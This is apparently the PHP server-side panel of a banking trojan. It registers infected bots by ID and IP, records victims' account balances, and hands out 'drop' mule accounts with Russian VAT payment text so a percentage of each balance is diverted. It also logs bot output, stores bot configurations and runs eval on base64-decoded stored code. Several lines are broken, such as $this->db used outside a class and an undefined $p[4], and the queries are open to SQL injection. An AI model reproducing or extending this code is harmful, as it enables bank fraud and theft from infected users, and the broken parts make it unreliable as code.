<?php

error_reporting(0);
ini_set('error_reporting', -1);
header("Pragma: no-cache");
header("Expires: 0");

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.numformat.php');
include_once($dir . 'includes/functions.get_config.php');
$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true, false);

$uid = empty($_GET['uid'])?null:$_GET['uid'];
$sys = empty($_GET['sys'])?null:$_GET['sys'];
$callback = empty($_GET['callback'])?null:$_GET['callback'];
$type = empty($_GET['type'])?null:$_GET['type'];
$ver = empty($_GET['ver'])?'':$_GET['ver'];
$userid = empty($_GET['cid'])?null:$_GET['cid'];

if(empty($uid)){
	print_data('BOT_ERROR!', true);
}else{
	$matches = explode('0', $uid, 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}else{
		print_data('BOT_ERROR!', true);
	}
}

$prefix = strtoupper($prefix);
$uid = strtoupper($uid);

if(!preg_match('~^([a-z])$~is',  $sys)) print_data('SYS_ERROR!', true);

$system = $mysqli->query('SELECT id, nid, percent, format FROM bf_systems WHERE (`nid` = \''.$sys.'\') LIMIT 1');
if(empty($system->id) || $system->nid !=  $sys) print_data('SYS_NOTFOUND!', true);

if(empty($userid)){
	if(file_exists($dir . 'cache/clients.json')){
		$clients = @json_decode(@file_get_contents($dir . 'cache/clients.json'), true);
		if(is_array($clients) && $clients[$prefix]){
			$userid = $clients[$prefix];
		}
	}
}

$id = $mysqli->query("INSERT INTO bf_bots set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', version='".$ver."', system='".$system->nid."', last_date = CURRENT_TIMESTAMP() on duplicate key update version = '".$ver."', last_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
if(!empty($id)){
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`id` = \''.$id.'\') LIMIT 1');
}else{
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\') LIMIT 1');
}

if($bot->prefix != $prefix && $bot->uid != $uid) print_data('BOT_FERROR!', true);

switch($_GET['type']){
    case 'getDrop':
        if(!empty($_GET['acc'])){
            $acc = clearNumFormat($_GET['acc']);
        }else{
            $acc = '';
        }
        
        if(!empty($_GET['sum'])){
            $sum = $_GET['sum'];
        }else{
            print_data('SUMM_ERROR!', true);
        }
        
        $dropstop = empty($_GET['dropstop'])?0:(int)$_GET['dropstop'];
        $transtop = empty($_GET['transtop'])?0:(int)$_GET['transtop'];
        
        $bot->info = json_decode(base64_decode($bot->info), 1);
	if(@$bot->info['getdrop'] != true){
		print(false);
		exit;
	}
	
	$mysqli->query("INSERT INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc."', system='".$system->nid."', balance='".$sum."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	
        //$system->sum = number_format((($p[4]*$system->percent)/100), 2, '.', '');
	$system->sum = floor(($p[4]*$system->percent)/100);
	
        //$mysqli->query('update bf_drops set status = \'0\', last_date = CURRENT_TIMESTAMP() WHERE (system LIKE \'%'.$system->nid.'|%\') AND (status = \'1\') AND (last_date < (CURRENT_TIMESTAMP() - INTERVAL 5 MINUTE))');
        $drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND ('.$system->sum.' > `from`) AND ('.$system->sum.' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') AND (userid = \''.$userid.'\') LIMIT 1');
	
        if(empty($drop->id) && empty($drop->system)){
		$drop = $this->db->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND (\''.$balance->balance.'\' < `max`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
		if(!empty($drop->id) && !empty($drop->system)){
		    if($drop->to <= $this->system->sum){
			$this->system->sum = $drop->to;
		    }else{
			unset($drop);
			$drop = false;
			return false;
		    }
		}else{
		    return false;
		}
	}
	
	if(!empty($drop->id) && !empty($drop->system)){
            $drop->other = array_map('base64_decode', json_decode($drop->other, true));
            if($drop->other['round'] == '1') $system->sum = floor((($sum*$system->percent)/100)/1000)*1000;
	    if($drop->vat != '0') $system->vat = number_format((($system->sum*$drop->vat)/100), 2, '.', '');
            
            if($drop->other['test'] != 1){
                if($dropstop == 1){
                    $mysqli->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
                }else{
                    $mysqli->query('update bf_drops set status = \'1\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
                }
            }else{
                $mysqli->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
            }
            
            $post_date = date('Y-m-d H:i:s');
            $sys = $system;
            unset($sys->format);
            
            if($transtop == 1){
                $trans_id = $mysqli->query("INSERT INTO bf_transfers (userid, prefix, uid, ip, acc, balance, `num`, `to`, system, status, info, drop_id, post_date) VALUES ('".$userid."', '".$bot->prefix."', '".$bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$acc."', '".$sum."', '".$system->sum."', '".$drop->acc."', '".$system->nid."', '2', '".base64_encode(json_encode(array('system' => $sys, 'drop' => $drop)))."', '".$drop->id."', '".$post_date."')");
            }else{
                $trans_id = $mysqli->query("INSERT INTO bf_transfers (userid, prefix, uid, ip, acc, balance, `num`, `to`, system, info, drop_id, post_date) VALUES ('".$userid."', '".$bot->prefix."', '".$bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$acc."', '".$sum."', '".$system->sum."', '".$drop->acc."', '".$system->nid."', '".base64_encode(json_encode(array('system' => $sys, 'drop' => $drop)))."', '".$drop->id."', '".$post_date."')");
            }
            
            if(empty($trans_id)){
                $transfer = $mysqli->query('SELECT id FROM bf_transfers WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`ip` = \''.$_SERVER['REMOTE_ADDR'].'\') AND (`acc` = \''.$acc.'\') AND (`to` = \''.$drop->acc.'\') AND (`system` = \''.$system->nid.'\') AND (`post_date` = \''.$post_date.'\') LIMIT 1');
                if(!empty($transfer->id)){
                    $trans_id = $transfer->id;
                }else{
                    die($callback . '(' . json_encode(false) . ')');
                }
            }
            unset($sys);
            
            if(empty($system->format)){
                $return = array();
                $return['did'] = $drop->id;
                $return['tid'] = $trans_id;
                $return['name'] = $drop->name;
                $return['receiver'] = $drop->receiver;
                $return['destination'] = $drop->destination;            
                $return['acc'] = accNumFormat($drop->acc);
                $return['vat'] = $drop->vat;
                $return['vatp'] = $system->vat;
                $return['summ'] = $system->sum;
            
                if($drop->vat != '0'){
                    $return['target'] = $drop->destination . "\n В том числе НДС (".$drop->vat."%)" . ' ' . $system->vat;
                }else{
                    $return['target'] = $drop->destination . "\n НДС не облагается.";
                }
                        
                $return['other'] = $drop->other;
				
                die($callback . '(' . json_encode($return) . ')');
            }else{
                include_once($dir . 'includes/functions.numformat.php');
	    	eval(base64_decode($system->format));
            }
        }else{
            die($callback . '(false)');
        }
    break;

    case 'setDrop':
        $did = empty($_GET['did'])?null:$_GET['did'];
        $mysqli->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$did.'\') AND (status = \'1\') LIMIT 1');
	die($callback . '(true)');
    break;

    case 'setTransfer':
        $tid = empty($_GET['tid'])?null:$_GET['tid'];
        $mysqli->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$tid.'\') LIMIT 1');
	die($callback . '(true)');
    break;

    case 'setLog':
        $log = empty($_GET['log'])?null:$_GET['log'];
        if($mysqli->query("INSERT INTO bf_logs (`userid`, `prefix`, `uid`, `ip`, `version`, `log`, system) VALUES ('".$userid."', '".$prefix."', '".$uid."', '".$_SERVER['REMOTE_ADDR']."', '".$ver."', '".$log."', '".$system->nid."')")){
            die($callback . '(true)');
        }else{
            die($callback . '(false)');
        }
    break;

    case 'getTransfer':
        $acc = empty($_GET['acc'])?null:$_GET['acc'];
        
        $trans = array();
        
        function get_trans($row){
            global $trans;
            
            $row->info = json_decode(base64_decode($row->info));
            
            $drop = &$row->info->drop;
            $drop['other'] = get_object_vars($row->info->drop->other);
            
            $system = &$row->info->system;
            
            $trans_id = $row->id;
            
            $return = array();
            $return['did'] = $drop->id;
            $return['tid'] = $trans_id;
            $return['name'] = $drop->name;
            $return['receiver'] = $drop->receiver;
            $return['destination'] = $drop->destination;            
            $return['acc'] = accNumFormat($drop->acc);
            $return['vat'] = $drop->vat;
            $return['vatp'] = $system->vat;
            $return['summ'] = $system->sum;
            
            if($drop->vat != '0'){
                $return['target'] = $drop->destination . "\n В том числе НДС (".$drop->vat."%)" . ' ' . $system->vat;
            }else{
                $return['target'] = $drop->destination . "\n НДС не облагается.";
            }
            
            $return['other'] = $drop->other;
            
            $trans[] = $return;
        }
        
        if(empty($acc)){
            $accs = $mysqli->query("SELECT * FROM bf_transfers WHERE (prefix = '".$prefix."') AND (uid = '".$uid."') AND (system = '".$system->nid."') AND (system = '".$system->nid."') AND (status != '0')", null, 'get_trans', false);
        }else{
            $accs = $mysqli->query("SELECT * FROM bf_transfers WHERE (prefix = '".$prefix."') AND (uid = '".$uid."') AND (system = '".$system->nid."') AND (system = '".$system->nid."') AND (acc = '".$acc."') AND (status != '0')", null, 'get_trans', false);
        }
        
        if(count($trans) > 0){
            die($callback . '(\''.json_encode($trans).'\')');
        }else{
            die($callback . '(false)');
        }
    break;

    case 'setCfg':
        $cfg = empty($_GET['cfg'])?null:$_GET['cfg'];
        $mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.$cfg.'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
	die($callback . '(true)');
    break;

    case 'getCfg':
        die($callback . '(' . $bot->info . ')');
    break;
}

?>